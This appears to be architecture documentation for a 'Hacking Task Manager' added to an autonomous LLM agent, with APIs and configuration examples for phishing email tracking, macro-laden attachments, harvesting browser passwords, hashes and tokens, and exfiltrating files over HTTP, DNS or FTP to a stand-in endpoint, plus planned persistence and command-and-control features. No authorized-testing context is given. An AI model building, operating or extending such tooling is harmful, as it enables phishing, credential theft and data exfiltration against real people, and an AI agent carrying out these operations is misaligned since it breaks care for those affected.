# Hacking Task Manager Architecture Documentation

## Overview

The Hacking Task Manager is a comprehensive extension to the AI agent orchestrator that enables advanced hacking tasks including email tracking, data extraction, and other security operations. This architecture provides a robust framework for managing complex hacking workflows with proper task orchestration, payload generation, and execution tracking.

## Architecture Components

### 1. HackingTaskManager (`src/modules/hacking_tasks_module.py`)

The central orchestrator for all hacking tasks. Key features:

- **Task Registration**: Register tasks with unique IDs and configurations
- **Status Management**: Track task lifecycle (registered → assigned → in_progress → completed/failed)
- **Agent Assignment**: Assign tasks to specific agents
- **Payload Generation**: Generate appropriate payloads for each task type
- **Task Tracking**: Monitor task progress and results

```python
# Example usage
task_manager = HackingTaskManager()
task_id = task_manager.register_task(TaskType.EMAIL_TRACKING, config)
task_manager.assign_task(task_id, "agent_001")
payload = task_manager.generate_payload(task_id)
```

### 2. PayloadGenerator System

Abstract base class for generating operation-specific payloads:

#### EmailTrackingPayloadGenerator
- **Pixel Tracking**: 1x1 transparent pixel for email open tracking
- **Link Tracking**: Redirect URLs with tracking parameters
- **Attachment Tracking**: Macro-enabled documents with tracking code

#### ExtractorPayloadGenerator
- **File Extraction**: Target specific file patterns and directories
- **Credential Extraction**: Harvest passwords, hashes, and tokens
- **System Info Extraction**: Collect system configuration and data
- **Exfiltration Methods**: HTTP, DNS, FTP with optional encryption

### 3. Specialized Task Classes (`src/modules/hacking_task_classes.py`)

High-level task implementations:

#### EmailTrackerTask
- Manages email tracking operations from creation to execution
- Handles payload generation and result processing
- Provides heartbeat functionality for long-running operations

#### ExtractorTask
- Manages data extraction operations
- Supports multiple extraction types and exfiltration methods
- Handles encryption and compression of extracted data

#### HackingTaskFactory
- Factory pattern for creating task instances
- Simplifies task creation and configuration

### 4. Agent Integration (`src/agent.py`)

Extended LLMAutonomousAgent with hacking task capabilities:

- **create_email_tracker()**: Create and start email tracking tasks
- **create_extractor()**: Create and start data extraction tasks
- **execute_hacking_task()**: Execute previously created tasks
- **get_hacking_tasks()**: Retrieve agent's assigned tasks
- **get_hacking_task_status()**: Get specific task status

### 5. Tool Manager Integration (`src/tool_manager.py`)

New hacking task tools registered in the ToolManager:

- **create_email_tracker**: Tool for creating email tracking tasks
- **create_extractor**: Tool for creating data extraction tasks
- **execute_hacking_task**: Tool for executing hacking tasks

## Task Types and Configurations

### Email Tracking Tasks

```python
email_config = {
    "target_email": "target@example.com",
    "tracking_type": "pixel",  # pixel, link, attachment
    "campaign_id": "campaign_001",
    "track_location": True,
    "custom_params": {
        "utm_source": "newsletter",
        "utm_medium": "email"
    }
}
```

**Tracking Types:**
- **Pixel**: 1x1 transparent pixel for open tracking
- **Link**: Redirect URLs with UTM parameters
- **Attachment**: Documents with embedded tracking code

### Data Extraction Tasks

```python
extractor_config = {
    "extraction_type": "files",  # files, credentials, system_info
    "target_path": "/Users/Target/Documents",
    "exfiltration_method": "http",  # http, dns, ftp
    "encryption": True,
    "exfil_endpoint": "https://exfil.example.com/upload",
    "file_patterns": ["*.pdf", "*.docx", "*.txt"],
    "compression": True
}
```

**Extraction Types:**
- **Files**: Target specific file patterns and directories
- **Credentials**: Harvest browser passwords, system hashes, application tokens
- **System Info**: Collect hardware, software, network configuration

**Exfiltration Methods:**
- **HTTP**: POST data to remote endpoint
- **DNS**: Encode data in DNS queries
- **FTP**: Upload files to FTP server

## Workflow Examples

### Complete Email Tracking Workflow

```python
# 1. Create agent with hacking task manager
agent = LLMAutonomousAgent(
    tool_manager=tool_manager,
    hacking_task_manager=HackingTaskManager()
)

# 2. Create email tracking task
email_config = {
    "target_email": "target@example.com",
    "tracking_type": "pixel",
    "campaign_id": "phishing_campaign_001"
}

result = agent.create_email_tracker(email_config)
task_id = result["task_id"]

# 3. Execute the task
tracking_result = agent.execute_hacking_task(task_id)

# 4. Monitor results
print(f"Tracking data: {tracking_result['tracking_data']}")
```

### Data Extraction Workflow

```python
# 1. Configure extraction
extractor_config = {
    "extraction_type": "credentials",
    "target_path": "/Users/Target",
    "exfiltration_method": "dns",
    "encryption": True
}

# 2. Create and assign task
result = agent.create_extractor(extractor_config)
task_id = result["task_id"]

# 3. Execute extraction
extraction_result = agent.execute_hacking_task(task_id)

# 4. Review extracted data
print(f"Credentials found: {extraction_result['extracted_data']['credentials_found']}")
```

## Security and Safety Features

### Human Approval System
Critical hacking tasks require human approval:

```python
# Critical action patterns
critical_action_patterns = {
    'hacking_tasks': ['create_email_tracker', 'create_extractor', 'execute_hacking_task']
}
```

### Configuration Validation
All payload generators validate configurations before execution:

- Email format validation for tracking tasks
- Path validation for extraction tasks
- Parameter validation for all task types

### Error Handling
Comprehensive error handling throughout the system:

- Invalid task IDs return None
- Invalid configurations fail gracefully
- Network errors are caught and logged
- Task failures are tracked and reported

## Testing and Validation

### Test Suite (`test_core_hacking.py`)

Comprehensive test coverage for all components:

1. **HackingTaskManager Tests**: Task lifecycle management
2. **Payload Generator Tests**: Configuration validation and payload generation
3. **Task Class Tests**: Specialized task execution
4. **Status Management Tests**: Task status transitions
5. **Error Handling Tests**: Invalid configurations and edge cases

### Running Tests

```bash
cd "c:\Users\DarkNode\Desktop\Projet Web\Alpha AI"
python test_core_hacking.py
```

## Integration Points

### With Existing Agent System
- Seamless integration with LLMAutonomousAgent
- Compatible with existing ToolManager
- Maintains memory and planning capabilities
- Supports human approval workflows

### With Tool Ecosystem
- Extensible payload generator system
- Plugin architecture for new task types
- Integration with existing security tools
- Support for custom exfiltration methods

## Future Extensions

### Additional Task Types
- **Network Exploitation**: Automated vulnerability exploitation
- **Social Engineering**: Phishing campaign management
- **Persistence**: Maintaining access mechanisms
- **C2 Communication**: Command and control operations

### Enhanced Features
- **Task Dependencies**: Define task execution order
- **Parallel Execution**: Run multiple tasks simultaneously
- **Result Aggregation**: Combine results from multiple tasks
- **Advanced Reporting**: Detailed operation reports

## File Structure

```
src/
├── modules/
│   ├── hacking_tasks_module.py      # Core task management system
│   ├── hacking_task_classes.py     # Specialized task implementations
│   └── [existing modules...]
├── agent.py                         # Extended agent with hacking capabilities
├── tool_manager.py                  # Updated with hacking task tools
└── [existing files...]

test_core_hacking.py                 # Comprehensive test suite
```

## Conclusion

The Hacking Task Manager architecture provides a robust, extensible framework for managing advanced hacking operations within the AI agent orchestrator. It combines proper software engineering practices with security-focused functionality, enabling sophisticated operations while maintaining safety and control mechanisms.

The system is designed to be:
- **Modular**: Components can be developed and tested independently
- **Extensible**: New task types and payload generators can be easily added
- **Secure**: Human approval and validation mechanisms prevent misuse
- **Observable**: Comprehensive logging and status tracking
- **Testable**: Full test coverage ensures reliability

This architecture enables AI agents to perform complex security operations while maintaining proper oversight and control mechanisms.
